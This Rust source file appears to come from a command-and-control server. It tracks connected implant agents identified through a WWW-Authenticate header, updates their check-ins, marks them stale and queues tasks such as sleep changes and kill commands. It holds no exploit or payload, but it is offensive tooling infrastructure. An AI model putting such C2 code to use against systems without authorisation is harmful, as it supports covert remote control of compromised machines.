use std::{collections::HashMap, sync::Arc};

use axum::http::HeaderMap;
use chrono::{DateTime, Duration, Utc};
use serde::{Deserialize, Serialize};
use shared::tasks::{Command, FirstRunData, Task, tasks_contains_kill_agent};
use tokio::{sync::RwLock, time::timeout};

use crate::{db::Db, logging::log_error_async};

#[derive(Serialize, Deserialize, Clone)]
pub struct Agent {
    pub uid: String,
    pub sleep: u64,
    pub first_run_data: FirstRunData,
    pub last_checkin_time: DateTime<Utc>,
    pub is_stale: bool,
}

impl Agent {
    /// Creates a new agent by querying the database. If the agent exists in the database, that will be
    /// returned, otherwise, a new agent will be inserted and that will be returned.
    async fn from_first_run_data(
        id: &str,
        db: &Db,
        frd: FirstRunData,
    ) -> Result<(Agent, Option<Vec<Task>>), String> {
        match db.get_agent_with_tasks_by_id(id, frd.clone()).await {
            Ok((agent, tasks)) => Ok((agent, tasks)),
            Err(e) => match e {
                sqlx::Error::RowNotFound => {
                    // Add the new agent into the db, and also return with it an empty vec
                    let new_agent = db
                        .insert_new_agent(id, frd)
                        .await
                        .map_err(|e| e.to_string())?;
                    return Ok((new_agent, None));
                }
                _ => {
                    return Err(e.to_string());
                }
            },
        }
    }

    pub fn get_config_data(&self) -> Vec<Task> {
        //
        // Here we. can push any tasks to the queue which we want the implant to execute at the point
        // of its first run, to set up any of its environment / runtime related tasks. For example, we can
        // set its sleep to be the last sleep setting the operator changed it to, where that would differ
        // from what is hardcoded.
        //

        vec![Task {
            id: 0,
            command: Command::UpdateSleepTime,
            metadata: Some(self.sleep.to_string()),
            completed_time: 0,
        }]
    }
}

type AgentHandle = Arc<RwLock<Agent>>;

/// AgentList holds data pertaining to the in-memory representation of all active agents connected
/// to the C2.
pub struct AgentList {
    // Each agent is represented by a HashMap where the Key is the ID, and the value is the Agent
    agents: RwLock<HashMap<String, AgentHandle>>,
}

impl AgentList {
    pub fn default() -> Self {
        Self {
            agents: RwLock::new(HashMap::new()),
        }
    }

    async fn snapshot_handles(&self) -> Vec<AgentHandle> {
        let lock = self.agents.read().await;
        lock.values().cloned().collect()
    }

    pub async fn snapshot_agents(&self) -> Vec<Agent> {
        let handles = self.snapshot_handles().await;
        let mut agents = Vec::with_capacity(handles.len());

        for handle in handles {
            let agent = handle.read().await;
            agents.push(agent.clone());
        }

        agents
    }

    /// Enumerates over all agents, determines whether an it is stale by calculating if we have
    /// gone past the expected check-in time of the agent by some time, `n` (where `n` is in seconds).
    pub async fn mark_agents_stale(&self) {
        let handles = self.snapshot_handles().await;

        for handle in handles {
            let (sleep, last_checkin_time) = {
                let lock = handle.read().await;
                (lock.sleep, lock.last_checkin_time)
            };

            let margin = Duration::seconds(calculate_max_time_till_stale(sleep).await);
            let now: DateTime<Utc> = Utc::now();

            let mut lock = handle.write().await;
            lock.is_stale = last_checkin_time + Duration::seconds(sleep as _) + margin < now;
        }
    }

    /// Gets an [`Agent`] from the HTTP request headers; if no such agent is currently connected
    /// an agent will be returned and added to the live list of agents.
    ///
    /// # Returns
    /// - An owned **copy** of the agent in the live list
    /// - An option of a Vector of Tasks, to be completed by the agent
    pub async fn get_agent_and_tasks_by_header(
        &self,
        headers: &HeaderMap,
        db: &Db,
        first_run_data: Option<FirstRunData>,
    ) -> Result<(Agent, Option<Vec<Task>>), String> {
        // Lookup the agent ID by extracting it from the headers
        let agent_id = extract_agent_id(headers)?;

        let mut re_request_frd: bool = false;

        //
        // Get or insert the agent
        //
        let existing = {
            let lock = self.agents.read().await;
            lock.get(&agent_id).cloned()
        };

        let handle: AgentHandle = if let Some(entry) = existing {
            entry
        } else {
            let Ok(db_call) = timeout(
                tokio::time::Duration::from_secs(5),
                Agent::from_first_run_data(
                    &agent_id,
                    db,
                    first_run_data.clone().unwrap_or_default(),
                ),
            )
            .await
            else {
                return Err("DB timeout in critical path".to_string());
            };

            let (new_agent, _) = match db_call {
                Ok(result) => result,
                Err(e) => {
                    return Err(format!("Failed to complete from_first_run_data. {e}"));
                }
            };

            let arc = Arc::new(RwLock::new(new_agent));
            let mut lock = self.agents.write().await;
            if let Some(existing) = lock.get(&agent_id) {
                Arc::clone(existing)
            } else {
                re_request_frd = first_run_data.is_none();
                lock.insert(agent_id.clone(), arc.clone());
                arc
            }
        };

        //
        // Update in place
        //

        let mut agent_for_db = {
            let mut lock = handle.write().await;
            if let Some(frd) = first_run_data {
                lock.first_run_data = frd;
            }
            lock.clone()
        };

        if let Err(e) = db.update_agent_checkin_time(&mut agent_for_db).await {
            return Err(format!("Failed to update checkin time. {e}"));
        }

        {
            let mut lock = handle.write().await;
            lock.last_checkin_time = agent_for_db.last_checkin_time;
            lock.first_run_data = agent_for_db.first_run_data.clone();
        }

        let Ok(mut tasks) = db.get_tasks_for_agent_by_uid(&agent_id).await else {
            return Err("Failed to get tasks for agent by UID.".to_string());
        };

        // Here is where we handle the case of needing to task first run data again
        if re_request_frd {
            let task = Task {
                id: 0,
                command: Command::AgentsFirstSessionBeacon,
                metadata: None,
                completed_time: 0,
            };

            match tasks.as_mut() {
                Some(tasks) => {
                    tasks.push(task);
                }
                None => tasks = Some(vec![task]),
            }
        }

        let snapshot = {
            let agent_guard = handle.read().await;
            agent_guard.clone()
        };

        Ok((snapshot, tasks))
    }

    pub async fn contains_agent_by_id(&self, id: &str) -> bool {
        let lock = self.agents.read().await;
        lock.contains_key(id)
    }

    pub async fn remove_agent(&self, id: &str) {
        let mut lock = self.agents.write().await;
        lock.remove(id);
    }
}

/// Extracts the agent ID from the headers.
///
/// # Panics
/// This function will panic the request should the agent ID (or any WWW-Authenticate header) not be found.
/// This is acceptable as we don't want to handle these requests..
pub fn extract_agent_id(headers: &HeaderMap) -> Result<String, String> {
    let Some(result) = headers.get("WWW-Authenticate") else {
        return Err("No agent id found in request".to_string());
    };

    let Ok(result) = result.to_str() else {
        return Err("Could not convert agent header to str".to_string());
    };

    Ok(result.to_string())
}

/// Checks whether the agent has the kill command as part of its tasks.
///
/// If the command is present, the agent will be removed from the list of active agents.
pub async fn handle_kill_command(
    agent_list: Arc<AgentList>,
    agent: &Agent,
    tasks: &Option<Vec<Task>>,
) {
    if tasks.is_none() {
        return;
    }

    if let Some(t) = tasks.as_ref() {
        if tasks_contains_kill_agent(t) {
            agent_list.remove_agent(&agent.uid).await;
        }
    }
}

/// Calculates the maximum time the agent can sleep for before becoming stale, and is set to
/// double the sleep time.
///
/// # Returns
/// An `i64` of the time to wait before marking as stale. If there is an integer error (value becomes
/// negative, overflows) during operations, an error will be logged and instead the return value will be
/// the sleep time of the agent + 1 hr.
async fn calculate_max_time_till_stale(sleep: u64) -> i64 {
    const MAX_SLEEP_TILL_STALE_MUL: u64 = 2;

    let res = match sleep.checked_mul(MAX_SLEEP_TILL_STALE_MUL) {
        Some(s) => s,
        None => {
            log_error_async(&format!(
                "Failed to multiply sleep time from input time: {sleep}."
            ))
            .await;

            sleep
        }
    } as i64;

    if res.is_negative() {
        log_error_async(&format!("Sleep time was negative time: {res}.")).await;

        return sleep as i64;
    }

    res
}
